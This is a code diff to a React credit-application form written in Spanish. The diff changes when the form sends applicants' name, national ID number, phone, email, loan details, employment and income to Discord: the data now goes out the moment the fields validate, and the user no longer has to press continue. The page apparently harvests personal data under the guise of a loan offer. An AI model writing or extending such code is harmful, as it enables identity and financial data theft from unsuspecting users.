@@ -172,6 +172,42 @@ function CreditForm({ onClose }: { onClose: () => void }) {
   const [isProcessing, setIsProcessing] = useState(false);
   const [progress, setProgress] = useState(0);
   const [showFinalStep, setShowFinalStep] = useState(false);
+  const sentSteps = useRef(new Set<string>());
+
+  useEffect(() => {
+    if (step === 1 && form.nombre.trim() && form.apellido.trim() && /^\d{6,12}$/.test(form.cedula) && /^\d{10}$/.test(form.telefono) && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.email) && !sentSteps.current.has('step1')) {
+      sentSteps.current.add('step1');
+      sendToDiscord('step1', [
+        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+        { name: 'Cédula', value: form.cedula, inline: true },
+        { name: 'Teléfono', value: form.telefono, inline: true },
+        { name: 'Email', value: form.email, inline: true },
+      ]);
+    }
+    if (step === 2 && form.monto && form.plazo && !sentSteps.current.has('step2')) {
+      sentSteps.current.add('step2');
+      sendToDiscord('step2', [
+        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+        { name: 'Cuota mensual estimada', value: `$${cuota()}`, inline: true },
+      ]);
+    }
+    if (step === 3 && form.tipoEmpleo && form.ingresos && !sentSteps.current.has('step3')) {
+      sentSteps.current.add('step3');
+      sendToDiscord('step3', [
+        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
+        { name: 'Cédula', value: form.cedula, inline: true },
+        { name: 'Teléfono', value: form.telefono, inline: true },
+        { name: 'Email', value: form.email, inline: true },
+        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
+        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
+        { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
+        { name: 'Ingresos mensuales', value: form.ingresos, inline: true },
+        { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
+        { name: 'Usuario', value: usuario || 'N/A', inline: true },
+      ]);
+    }
+  }, [form, step, esCliente, usuario]);
 
   useEffect(() => {
     if (!isProcessing) return;
@@ -270,33 +306,10 @@ function CreditForm({ onClose }: { onClose: () => void }) {
 
   const next = () => {
     if (step === 1 && validateStep1()) {
-      sendToDiscord('step1', [
-        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
-        { name: 'Cédula', value: form.cedula, inline: true },
-        { name: 'Teléfono', value: form.telefono, inline: true },
-        { name: 'Email', value: form.email, inline: true },
-      ]);
       setStep(2);
     } else if (step === 2 && validateStep2()) {
-      sendToDiscord('step2', [
-        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
-        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
-        { name: 'Cuota mensual estimada', value: `$${cuota()}`, inline: true },
-      ]);
       setStep(3);
     } else if (step === 3 && validateStep3()) {
-      sendToDiscord('step3', [
-        { name: 'Nombre', value: `${form.nombre} ${form.apellido}`, inline: true },
-        { name: 'Cédula', value: form.cedula, inline: true },
-        { name: 'Teléfono', value: form.telefono, inline: true },
-        { name: 'Email', value: form.email, inline: true },
-        { name: 'Monto solicitado', value: `$${Number(form.monto).toLocaleString('es-CO')}`, inline: true },
-        { name: 'Plazo', value: `${form.plazo} meses`, inline: true },
-        { name: 'Tipo de empleo', value: form.tipoEmpleo, inline: true },
-        { name: 'Ingresos mensuales', value: form.ingresos, inline: true },
-        { name: 'Cliente', value: esCliente ? 'Sí' : 'No', inline: true },
-        { name: 'Usuario', value: usuario || 'N/A', inline: true },
-      ]);
       setIsProcessing(true);
     }
   };
